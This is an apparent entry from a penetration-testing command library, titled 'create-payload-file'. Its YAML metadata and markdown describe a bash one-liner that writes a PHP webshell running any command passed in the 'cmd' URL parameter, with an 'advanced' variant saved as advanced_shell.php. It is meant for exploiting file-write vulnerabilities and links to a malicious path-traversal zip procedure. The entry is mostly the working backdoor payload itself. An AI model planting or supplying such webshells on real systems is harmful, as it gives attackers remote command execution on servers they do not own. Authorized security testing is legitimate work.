---
id: c2f3g4h5-i6j7-8902-fghi-6789012345
data: 'echo ''<?php system($_GET["cmd"]); ?>'' > poc_file'
tags:
  - php
  - shell
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:27.884Z'
verified: false
validated: true
submitted: true
---
# create-payload-file

## Command

```bash
echo '<?php system($_GET["cmd"]); ?>' > poc_file
```

## Description

Creates a simple PHP webshell file for RCE payloads in exploitation scenarios like file write vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| poc_file | Output filename | Yes |

## Examples

### Basic Usage

```bash
echo '<?php system($_GET["cmd"]); ?>' > poc_file
```

### Advanced Usage

```bash
echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > advanced_shell.php
```

## Expected Output

File poc_file created with PHP code.

## Related

- [[Related Procedure: Craft-Malicious-Zip-with-Path-Traversal]]
